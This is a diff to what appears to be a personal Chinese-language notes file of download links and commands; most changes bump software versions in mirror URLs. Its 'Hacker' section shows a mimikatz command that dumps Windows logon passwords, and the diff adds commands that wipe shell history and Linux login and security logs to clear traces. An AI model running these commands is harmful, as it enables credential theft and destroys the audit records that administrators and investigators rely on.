@@ -463,8 +463,8 @@ https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.16.jar
 ----
 java -jar tika-app-1.16.jar -h 123 > 123.html
 
-https://mirrors.ustc.edu.cn/node/latest/node-v9.1.0-win-x64.7z
-https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-3.7.0.tgz
+https://mirrors.ustc.edu.cn/node/latest/node-v9.2.0-win-x64.7z
+https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-3.7.3.tgz
 https://npm.taobao.org/mirrors/
 ----
 npm --registry=https://registry.npm.taobao.org install -g test
@@ -797,7 +797,7 @@ http://ww4.sinaimg.cn/large/a15b4afegy1fk3opedx7sj203k03kt99
 ```
 
 ## Hacker
-```html
+```bash
 漏洞：
 https://drops.tuisec.win/
 https://paper.tuisec.win/
@@ -829,6 +829,15 @@ Windows 密码：mimikatz
 https://github.com/gentilkiwi/mimikatz
 -----
 mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpasswords exit
+
+Linux 清空痕迹：
+unset HISTFILE
+echo > /root/.bash_history
+echo > /var/run/utmp
+echo > /var/log/wtmp
+echo > /var/log/btmp
+echo > /var/log/secure
+echo > /var/log/lastlog
 ```
 
 ```bash
